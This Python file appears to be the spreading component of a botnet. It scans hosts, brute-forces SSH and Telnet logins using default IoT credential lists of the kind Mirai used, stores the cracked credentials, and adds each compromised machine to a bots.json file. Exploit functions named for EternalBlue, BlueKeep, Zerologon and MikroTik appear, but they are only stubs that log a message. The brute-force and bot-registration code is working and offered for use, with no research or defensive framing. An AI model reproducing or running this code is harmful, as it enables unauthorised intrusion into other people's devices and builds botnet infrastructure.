import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress, telnetlib3
from utils.logger import log

LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}

SSH_PASSWORDS = [
    'root','admin','password','123456','qwerty','letmein','p@ssw0rd',
    'changeme','r00t','toor','ubuntu','administrator','user','guest',
    '1','1234','12345','123456789','pass','ftp','mysql','oracle',
    'vizxv','juantech','xc3511','zlxx.','hi3518','oelinux1','Zte521',
    'tsgoingon','default','system','super','dreambox','xmhdipc',
    'support','tech','operator','manager','cisco','netgear'
]

TELNET_PASSWORDS = [
    ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
    ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
    ('admin','admin'),('admin','password'),('admin','123456'),('admin','1234'),
    ('admin','default'),('root','default'),('root','root'),('guest','guest'),
    ('support','support'),('user','user'),('service','service')
]

DB_PATH = "spreader_learn.db"
BOTS_FILE = "bots.json"

async def init_db():
    import aiosqlite
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("CREATE TABLE IF NOT EXISTS creds (ip TEXT, username TEXT, password TEXT, service TEXT, success INTEGER DEFAULT 1)")
        await db.execute("CREATE TABLE IF NOT EXISTS vulns (ip TEXT, service TEXT, cve TEXT, success INTEGER DEFAULT 1)")
        await db.commit()

async def learn_credentials(ip, username, password, service='ssh'):
    import aiosqlite
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO creds (ip, username, password, service, success) VALUES (?,?,?,?,1)", (ip, username, password, service))
        await db.commit()

async def add_bot(ip, username='root', os_type='linux', via='ssh'):
    bot = {
        "id": ip,
        "ip": ip,
        "os": os_type,
        "status": "online",
        "bandwidth": 10,
        "via": via
    }
    bots = []
    if os.path.exists(BOTS_FILE):
        with open(BOTS_FILE, 'r') as f:
            try: bots = json.load(f)
            except: bots = []
    if not any(b.get('ip') == ip for b in bots):
        bots.append(bot)
        with open(BOTS_FILE, 'w') as f:
            json.dump(bots, f, indent=2)
        log(f"{LOG_PREFIX['new']} Бот добавлен: {ip} ({via})")
        return True
    return False

async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 80], timeout=1.0):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

async def telnet_bruteforce(ip):
    for user, pwd in TELNET_PASSWORDS:
        try:
            reader, writer = await asyncio.wait_for(
                telnetlib3.open_connection(ip, 23, timeout=3),
                timeout=5
            )
            output = await asyncio.wait_for(reader.readuntil(b'login: '), timeout=3)
            writer.write(user.encode() + b'\n')
            await asyncio.wait_for(reader.readuntil(b'Password: '), timeout=3)
            writer.write(pwd.encode() + b'\n')
            try:
                result = await asyncio.wait_for(reader.read(1024), timeout=3)
                if b'#' in result or b'$' in result or b'>' in result:
                    log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
                    await add_bot(ip, user, 'iot', 'telnet')
                    writer.close()
                    return True, pwd
            except:
                pass
            writer.close()
        except:
            pass
    return False, None

async def ssh_bruteforce(ip, username='root'):
    if 22 not in await quick_port_scan(ip, [22]):
        return False, None
    sem = asyncio.Semaphore(30)
    async def try_pass(pwd):
        async with sem:
            try:
                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=2) as conn:
                    log(f"{LOG_PREFIX['brute']} SSH {ip} {username}:{pwd}")
                    await learn_credentials(ip, username, pwd, 'ssh')
                    await add_bot(ip, username, 'linux', 'ssh')
                    return True, pwd
            except:
                pass
        return False, pwd
    tasks = [try_pass(p) for p in SSH_PASSWORDS]
    results = await asyncio.gather(*tasks)
    for success, pwd in results:
        if success:
            return True, pwd
    return False, None

async def exploit_eternalblue(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
    return False

async def exploit_mikrotik(target_ip):
    if 8291 not in await quick_port_scan(target_ip, [8291]): return False
    log(f"{LOG_PREFIX['exploit']} MikroTik {target_ip}")
    return False

async def exploit_bluekeep(target_ip):
    if 3389 not in await quick_port_scan(target_ip, [3389]): return False
    log(f"{LOG_PREFIX['exploit']} BlueKeep {target_ip}")
    return False

async def exploit_zerologon(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} Zerologon {target_ip}")
    return False
